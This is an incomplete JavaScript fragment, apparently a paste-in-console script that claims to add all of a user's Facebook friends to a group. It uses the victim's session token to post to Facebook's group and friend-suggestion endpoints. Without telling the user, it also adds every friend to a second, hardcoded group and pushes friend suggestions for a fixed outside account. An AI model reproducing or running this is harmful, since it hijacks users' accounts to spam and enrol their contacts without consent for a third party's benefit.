...
var Title = 'Auto Add All Friends To Group Made By <A style="color:#3B5998;" href="http://facebook.com/588202497939346">Vietnamese Auto Group</A>';
grpname = document.getElementById("groupsJumpTitle").innerHTML;
var Descriptions = "",
    _text = 'Powered By <A style="color:#3B5998;" href=" http://www.facebook.com/groups/588202497939346/">Vietnamese Auto Group.</A> Join it now.';

function AddFriendtoGroup(e) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=" + gid + "&source=typeahead&members=" + e + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function (a) {
        ...
        if (i > 0) {
            ...
            d += getuname + " Thanks For Adding Your Friends in " + grpname + ".<br/>";
            d += _text;
            d += "</div>";
            d += "</div>"
        } else {
    ...
    if (gid != 689255414468771) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=689255414468771&source=typeahead&members=" + e + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post")
    }
    if (newcomer) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + e + "&newcomer=100003402522960&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581651071156988110194", function () {}, "text", "post")
    }
}
